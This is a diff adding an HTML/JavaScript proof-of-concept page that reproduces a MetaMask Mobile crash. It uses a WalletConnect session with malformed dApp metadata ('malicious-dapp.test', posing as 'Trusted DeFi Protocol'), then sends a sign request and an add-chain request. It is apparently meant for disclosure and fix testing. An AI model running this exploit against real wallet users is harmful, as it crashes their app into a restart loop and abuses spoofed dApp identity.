@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>POC: Malformed dApp URL Vulnerability Test</title>
+  <style>
+    :root {
+      --bg-primary: #1a1a2e;
+      --bg-secondary: #16213e;
+      --bg-card: #0f3460;
+      --accent: #e94560;
+      --accent-hover: #ff6b6b;
+      --text-primary: #eaeaea;
+      --text-secondary: #a0a0a0;
+      --success: #00d26a;
+      --warning: #ffc107;
+      --error: #ff4757;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
+      background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+      min-height: 100vh;
+      color: var(--text-primary);
+      padding: 2rem;
+    }
+
+    .container { max-width: 900px; margin: 0 auto; }
+
+    header {
+      text-align: center;
+      margin-bottom: 2rem;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+    }
+
+    h1 { font-size: 1.6rem; color: var(--accent); margin-bottom: 0.5rem; }
+    .subtitle { color: var(--text-secondary); font-size: 0.85rem; }
+
+    .warning-banner {
+      background: linear-gradient(90deg, rgba(255, 193, 7, 0.1), rgba(255, 71, 87, 0.1));
+      border: 1px solid var(--warning);
+      border-radius: 8px;
+      padding: 1rem;
+      margin-bottom: 1.5rem;
+      font-size: 0.85rem;
+    }
+
+    .card {
+      background: var(--bg-card);
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .card-title {
+      font-size: 1rem;
+      color: var(--accent);
+      margin-bottom: 1rem;
+    }
+
+    .input-group {
+      margin-bottom: 1rem;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 6px;
+      color: var(--text-primary);
+      font-family: inherit;
+      font-size: 0.9rem;
+    }
+
+    .input-group input:focus {
+      outline: none;
+      border-color: var(--accent);
+    }
+
+    .input-group small {
+      display: block;
+      margin-top: 0.5rem;
+      color: var(--text-secondary);
+      font-size: 0.75rem;
+    }
+
+    .input-group small a {
+      color: var(--accent);
+    }
+
+    .steps-list {
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      padding: 1rem;
+      font-size: 0.8rem;
+    }
+
+    .steps-list ol {
+      margin-left: 1.5rem;
+    }
+
+    .steps-list li {
+      margin-bottom: 0.5rem;
+      line-height: 1.4;
+    }
+
+    .steps-list .highlight {
+      color: var(--error);
+      font-weight: bold;
+    }
+
+    .url-options { display: flex; flex-direction: column; gap: 0.5rem; margin-bottom: 1rem; }
+
+    .url-option {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      padding: 0.6rem 1rem;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 6px;
+      cursor: pointer;
+      border: 1px solid transparent;
+      font-size: 0.85rem;
+    }
+
+    .url-option:hover { background: rgba(0, 0, 0, 0.4); }
+    .url-option.selected { border-color: var(--accent); background: rgba(233, 69, 96, 0.1); }
+    .url-option input[type="radio"] { accent-color: var(--accent); }
+    .url-option .url-text { flex: 1; }
+    .url-option .url-label { font-size: 0.65rem; padding: 0.15rem 0.4rem; border-radius: 4px; }
+    .url-option .malformed { background: var(--error); color: white; }
+    .url-option .valid { background: var(--success); color: white; }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      padding: 0.85rem 1.5rem;
+      font-size: 0.9rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      margin-bottom: 0.5rem;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+      color: white;
+    }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+    
+    .btn-secondary {
+      background: rgba(255, 255, 255, 0.1);
+      color: var(--text-primary);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    .btn-secondary:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .btn-danger {
+      background: linear-gradient(135deg, var(--error), #ff6b6b);
+      color: white;
+    }
+
+    .btn-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.5rem;
+    }
+
+    .status {
+      margin-top: 1rem;
+      padding: 1rem;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      display: none;
+    }
+    .status.visible { display: block; }
+    .status.info { background: rgba(0, 210, 106, 0.1); border: 1px solid var(--success); color: var(--success); }
+    .status.error { background: rgba(255, 71, 87, 0.1); border: 1px solid var(--error); color: var(--error); }
+    .status.pending { background: rgba(255, 193, 7, 0.1); border: 1px solid var(--warning); color: var(--warning); }
+
+    .qr-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 1rem;
+      margin-top: 1rem;
+    }
+    .qr-container.visible { display: flex; }
+
+    .qr-code {
+      background: white;
+      padding: 1rem;
+      border-radius: 12px;
+    }
+    .qr-code img { display: block; width: 240px; height: 240px; }
+
+    .uri-display {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 8px;
+      padding: 0.75rem;
+      word-break: break-all;
+      font-size: 0.6rem;
+      color: var(--text-secondary);
+      max-height: 60px;
+      overflow-y: auto;
+    }
+
+    .actions-panel {
+      display: none;
+      margin-top: 1rem;
+      padding: 1rem;
+      background: rgba(0, 100, 0, 0.1);
+      border: 1px solid var(--success);
+      border-radius: 8px;
+    }
+    .actions-panel.visible { display: block; }
+    .actions-panel h4 { color: var(--success); margin-bottom: 1rem; font-size: 0.9rem; }
+
+    .log-container {
+      max-height: 200px;
+      overflow-y: auto;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 8px;
+      padding: 1rem;
+      font-size: 0.7rem;
+    }
+
+    .log-entry { padding: 0.2rem 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
+    .log-entry:last-child { border-bottom: none; }
+    .log-entry .time { color: var(--text-secondary); margin-right: 0.5rem; }
+    .log-entry.error { color: var(--error); }
+    .log-entry.success { color: var(--success); }
+    .log-entry.warn { color: var(--warning); }
+
+    .loading {
+      display: inline-block;
+      width: 14px;
+      height: 14px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 6px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 0.5rem;
+      margin-bottom: 1rem;
+    }
+    .step {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+      font-weight: bold;
+    }
+    .step.active { background: var(--accent); }
+    .step.done { background: var(--success); }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>🔓 Malformed dApp URL - DoS POC</h1>
+      <p class="subtitle">WalletConnect Metadata Vulnerability Test</p>
+    </header>
+
+    <div class="warning-banner">
+      <p><strong>⚠️ Reproduction Steps:</strong></p>
+      <div class="steps-list">
+        <ol>
+          <li>Enter Project ID and select malformed URL</li>
+          <li>Generate QR and scan with MetaMask Mobile</li>
+          <li>Observe the malformed domain display, click <strong>"Connect"</strong></li>
+          <li>Click <strong>"Sign Message"</strong> below</li>
+          <li>In MetaMask, click <strong>"Cancel"</strong></li>
+          <li>Click <strong>"Add Chain"</strong> below</li>
+          <li class="highlight">Observe: App crashes! Restart causes crash loop until dApp disconnected</li>
+        </ol>
+      </div>
+    </div>
+
+    <div class="step-indicator">
+      <div class="step" id="step1">1</div>
+      <div class="step" id="step2">2</div>
+      <div class="step" id="step3">3</div>
+      <div class="step" id="step4">4</div>
+      <div class="step" id="step5">5</div>
+      <div class="step" id="step6">6</div>
+    </div>
+
+    <div class="card">
+      <h2 class="card-title">🔑 Configuration</h2>
+      
+      <div class="input-group">
+        <label for="project-id">WalletConnect Project ID:</label>
+        <input type="text" id="project-id" placeholder="Enter your Project ID from cloud.walletconnect.com">
+        <small>Get free ID from <a href="https://cloud.walletconnect.com/" target="_blank">cloud.walletconnect.com</a></small>
+      </div>
+
+      <div class="url-options">
+        <label class="url-option selected">
+          <input type="radio" name="url-type" value="malformed" checked>
+          <span class="url-text"><code>malicious-dapp.test</code></span>
+          <span class="url-label malformed">No Protocol</span>
+        </label>
+        <label class="url-option">
+          <input type="radio" name="url-type" value="valid">
+          <span class="url-text"><code>https://example.com</code></span>
+          <span class="url-label valid">Valid</span>
+        </label>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2 class="card-title">🔗 Step 1-3: Connect</h2>
+      
+      <button class="btn btn-primary" id="connect-btn" disabled>
+        <span id="btn-text">Loading...</span>
+      </button>
+
+      <div class="qr-container" id="qr-container">
+        <div class="qr-code" id="qr-code"></div>
+        <p style="color: var(--text-secondary); font-size: 0.8rem;">Scan with MetaMask Mobile → Connect</p>
+        <div class="uri-display" id="uri-display"></div>
+        <button class="btn btn-secondary" id="copy-uri-btn">📋 Copy URI</button>
+      </div>
+
+      <div class="status" id="status"></div>
+
+      <div class="actions-panel" id="actions-panel">
+        <h4>✅ Connected! Now trigger the crash:</h4>
+        
+        <div class="btn-row">
+          <button class="btn btn-secondary" id="sign-btn">
+            📝 Step 4: Sign Message
+          </button>
+          <button class="btn btn-danger" id="add-chain-btn">
+            ⛓️ Step 6: Add Chain
+          </button>
+        </div>
+        
+        <p style="color: var(--text-secondary); font-size: 0.75rem; margin-top: 0.75rem;">
+          1. Click "Sign Message" → Cancel in MetaMask<br>
+          2. Click "Add Chain" → App should crash
+        </p>
+
+        <button class="btn btn-secondary" id="disconnect-btn" style="margin-top: 1rem;">
+          🔌 Disconnect Session
+        </button>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2 class="card-title">📜 Event Log</h2>
+      <div class="log-container" id="log-container"></div>
+    </div>
+  </div>
+
+  <script type="module">
+    const URL_OPTIONS = {
+      malformed: 'malicious-dapp.test',
+      valid: 'https://example.com'
+    };
+
+    let selectedUrlKey = 'malformed';
+    let signClient = null;
+    let currentSession = null;
+    let SignClient = null;
+    let Core = null;
+
+    // DOM
+    const projectIdInput = document.getElementById('project-id');
+    const connectBtn = document.getElementById('connect-btn');
+    const btnText = document.getElementById('btn-text');
+    const qrContainer = document.getElementById('qr-container');
+    const qrCodeDiv = document.getElementById('qr-code');
+    const uriDisplay = document.getElementById('uri-display');
+    const copyUriBtn = document.getElementById('copy-uri-btn');
+    const statusDiv = document.getElementById('status');
+    const logContainer = document.getElementById('log-container');
+    const actionsPanel = document.getElementById('actions-panel');
+    const signBtn = document.getElementById('sign-btn');
+    const addChainBtn = document.getElementById('add-chain-btn');
+    const disconnectBtn = document.getElementById('disconnect-btn');
+
+    // Steps
+    const steps = [1,2,3,4,5,6].map(n => document.getElementById(`step${n}`));
+    
+    function setStep(n) {
+      steps.forEach((s, i) => {
+        s.classList.remove('active', 'done');
+        if (i < n - 1) s.classList.add('done');
+        if (i === n - 1) s.classList.add('active');
+      });
+    }
+
+    // Load saved project ID
+    const savedProjectId = localStorage.getItem('wc_project_id');
+    if (savedProjectId) projectIdInput.value = savedProjectId;
+    projectIdInput.addEventListener('change', () => {
+      localStorage.setItem('wc_project_id', projectIdInput.value.trim());
+    });
+
+    function log(message, type = 'info') {
+      const time = new Date().toTimeString().split(' ')[0];
+      const entry = document.createElement('div');
+      entry.className = `log-entry ${type}`;
+      entry.innerHTML = `<span class="time">[${time}]</span>${message}`;
+      logContainer.appendChild(entry);
+      logContainer.scrollTop = logContainer.scrollHeight;
+      console.log(`[${type.toUpperCase()}] ${message}`);
+    }
+
+    function showStatus(message, type = 'info') {
+      statusDiv.className = `status visible ${type}`;
+      statusDiv.textContent = message;
+    }
+
+    function getMetadata() {
+      const url = URL_OPTIONS[selectedUrlKey];
+      return {
+        name: 'Trusted DeFi Protocol',
+        description: 'Secure Web3 Application',
+        url: url,  // Malformed URL!
+        icons: ['https://raw.githubusercontent.com/AugurProject/Augur-Node/master/logo.png']
+      };
+    }
+
+    document.querySelectorAll('.url-option').forEach(option => {
+      option.addEventListener('click', () => {
+        document.querySelectorAll('.url-option').forEach(o => o.classList.remove('selected'));
+        option.classList.add('selected');
+        const radio = option.querySelector('input[type="radio"]');
+        radio.checked = true;
+        selectedUrlKey = radio.value;
+        log(`Selected URL: "${URL_OPTIONS[selectedUrlKey]}"`);
+      });
+    });
+
+    function generateQR(text) {
+      qrCodeDiv.innerHTML = '';
+      const img = document.createElement('img');
+      img.src = `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(text)}`;
+      img.alt = 'WalletConnect QR Code';
+      qrCodeDiv.appendChild(img);
+    }
+
+    async function loadWalletConnect() {
+      try {
+        log('Loading WalletConnect...');
+        const signClientModule = await import('https://esm.sh/@walletconnect/sign-client@2.17.0');
+        SignClient = signClientModule.SignClient || signClientModule.default;
+
+        const coreModule = await import('https://esm.sh/@walletconnect/core@2.17.0');
+        Core = coreModule.Core || coreModule.default;
+        
+        log('Libraries loaded ✓', 'success');
+        return true;
+      } catch (err) {
+        log(`Load error: ${err.message}`, 'error');
+        return false;
+      }
+    }
+
+    async function initSignClient(projectId) {
+      const metadata = getMetadata();
+      
+      log(`Metadata URL: "${metadata.url}" (${selectedUrlKey === 'malformed' ? 'MALFORMED' : 'valid'})`);
+      
+      const core = new Core({ projectId });
+
+      signClient = await SignClient.init({
+        core,
+        metadata: metadata
+      });
+
+      log('SignClient initialized ✓', 'success');
+
+      signClient.on('session_delete', () => {
+        log('Session deleted', 'warn');
+        currentSession = null;
+        actionsPanel.classList.remove('visible');
+        setStep(1);
+      });
+
+      return signClient;
+    }
+
+    async function connect() {
+      const projectId = projectIdInput.value.trim();
+      if (!projectId) {
+        showStatus('Enter a Project ID first!', 'error');
+        return;
+      }
+
+      try {
+        connectBtn.disabled = true;
+        btnText.innerHTML = '<span class="loading"></span>Initializing...';
+        setStep(1);
+        
+        await initSignClient(projectId);
+
+        btnText.innerHTML = '<span class="loading"></span>Creating pairing...';
+
+        const { uri, approval } = await signClient.connect({
+          requiredNamespaces: {
+            eip155: {
+              methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData', 'wallet_addEthereumChain', 'wallet_switchEthereumChain'],
+              chains: ['eip155:1'],
+              events: ['chainChanged', 'accountsChanged']
+            }
+          }
+        });
+
+        if (!uri) throw new Error('No URI generated');
+
+        log('QR Code ready - scan with MetaMask');
+        setStep(2);
+        uriDisplay.textContent = uri;
+        generateQR(uri);
+        qrContainer.classList.add('visible');
+        showStatus('Scan QR → Observe malformed domain → Click Connect', 'pending');
+        
+        btnText.innerHTML = '<span class="loading"></span>Waiting for approval...';
+
+        currentSession = await approval();
+        
+        log(`Connected! Topic: ${currentSession.topic}`, 'success');
+        log(`Accounts: ${currentSession.namespaces.eip155?.accounts?.join(', ')}`);
+        
+        setStep(3);
+        showStatus('Connected! Now follow steps 4-6 to trigger crash.', 'info');
+        actionsPanel.classList.add('visible');
+        qrContainer.classList.remove('visible');
+
+      } catch (error) {
+        console.error('Error:', error);
+        if (error.message?.includes('rejected')) {
+          log('Connection rejected', 'warn');
+          showStatus('Connection rejected by wallet', 'pending');
+        } else {
+          log(`Error: ${error.message}`, 'error');
+          showStatus(`Error: ${error.message}`, 'error');
+        }
+      } finally {
+        connectBtn.disabled = false;
+        btnText.textContent = 'Generate Connection';
+      }
+    }
+
+    async function sendSignRequest() {
+      if (!currentSession) {
+        log('No active session!', 'error');
+        return;
+      }
+
+      try {
+        setStep(4);
+        signBtn.disabled = true;
+        signBtn.innerHTML = '<span class="loading"></span>Signing...';
+        log('Sending personal_sign request...');
+        showStatus('Sign request sent. Click CANCEL in MetaMask!', 'pending');
+
+        const accounts = currentSession.namespaces.eip155?.accounts || [];
+        const address = accounts[0]?.split(':')[2] || '0x0000000000000000000000000000000000000000';
+
+        const result = await signClient.request({
+          topic: currentSession.topic,
+          chainId: 'eip155:1',
+          request: {
+            method: 'personal_sign',
+            params: [
+              '0x4d6573736167652066726f6d206d616c6963696f757320644170702e2054686973206973206120746573742e',
+              address
+            ]
+          }
+        });
+
+        log(`Sign result: ${result}`, 'success');
+        setStep(5);
+        showStatus('Signed! Now click "Add Chain" to trigger crash.', 'info');
+
+      } catch (error) {
+        if (error.message?.includes('rejected') || error.message?.includes('User rejected')) {
+          log('User cancelled signing ✓', 'success');
+          setStep(5);
+          showStatus('Cancelled! Now click "Add Chain" to trigger crash.', 'pending');
+        } else {
+          log(`Sign error: ${error.message}`, 'error');
+        }
+      } finally {
+        signBtn.disabled = false;
+        signBtn.innerHTML = '📝 Step 4: Sign Message';
+      }
+    }
+
+    async function sendAddChainRequest() {
+      if (!currentSession) {
+        log('No active session!', 'error');
+        return;
+      }
+
+      try {
+        setStep(6);
+        addChainBtn.disabled = true;
+        addChainBtn.innerHTML = '<span class="loading"></span>Adding chain...';
+        log('Sending wallet_addEthereumChain request...');
+        log('⚠️ This should trigger the crash in vulnerable versions!', 'warn');
+        showStatus('Add chain request sent. Watch MetaMask for crash!', 'error');
+
+        const result = await signClient.request({
+          topic: currentSession.topic,
+          chainId: 'eip155:1',
+          request: {
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: '0x89',  // Polygon
+              chainName: 'Polygon Mainnet',
+              nativeCurrency: {
+                name: 'MATIC',
+                symbol: 'MATIC',
+                decimals: 18
+              },
+              rpcUrls: ['https://polygon-rpc.com'],
+              blockExplorerUrls: ['https://polygonscan.com']
+            }]
+          }
+        });
+
+        log(`Add chain result: ${JSON.stringify(result)}`, 'success');
+        showStatus('Chain added! If app didn\'t crash, the fix is working.', 'info');
+
+      } catch (error) {
+        log(`Add chain error: ${error.message}`, 'error');
+        if (error.message?.includes('rejected')) {
+          showStatus('User rejected. Try again or check if app crashed.', 'pending');
+        } else {
+          showStatus(`Error: ${error.message}`, 'error');
+        }
+      } finally {
+        addChainBtn.disabled = false;
+        addChainBtn.innerHTML = '⛓️ Step 6: Add Chain';
+      }
+    }
+
+    async function disconnect() {
+      if (!currentSession) return;
+      
+      try {
+        await signClient.disconnect({
+          topic: currentSession.topic,
+          reason: { code: 6000, message: 'User disconnected' }
+        });
+        log('Disconnected', 'success');
+        currentSession = null;
+        actionsPanel.classList.remove('visible');
+        setStep(1);
+        showStatus('Disconnected. Connect again to retry.', 'info');
+      } catch (error) {
+        log(`Disconnect error: ${error.message}`, 'error');
+      }
+    }
+
+    copyUriBtn.addEventListener('click', () => {
+      const uri = uriDisplay.textContent;
+      if (!uri) return;
+      navigator.clipboard.writeText(uri).then(() => {
+        copyUriBtn.textContent = '✓ Copied!';
+        setTimeout(() => copyUriBtn.textContent = '📋 Copy URI', 2000);
+      });
+    });
+
+    connectBtn.addEventListener('click', connect);
+    signBtn.addEventListener('click', sendSignRequest);
+    addChainBtn.addEventListener('click', sendAddChainRequest);
+    disconnectBtn.addEventListener('click', disconnect);
+
+    async function init() {
+      log('Initializing POC...');
+      setStep(1);
+      
+      const loaded = await loadWalletConnect();
+      
+      if (loaded) {
+        log('Ready! Enter Project ID to begin.');
+        connectBtn.disabled = false;
+        btnText.textContent = 'Generate Connection';
+      } else {
+        log('Failed to load. Refresh page.', 'error');
+        btnText.textContent = 'Load Failed';
+      }
+    }
+
+    init();
+  </script>
+</body>
+</html>
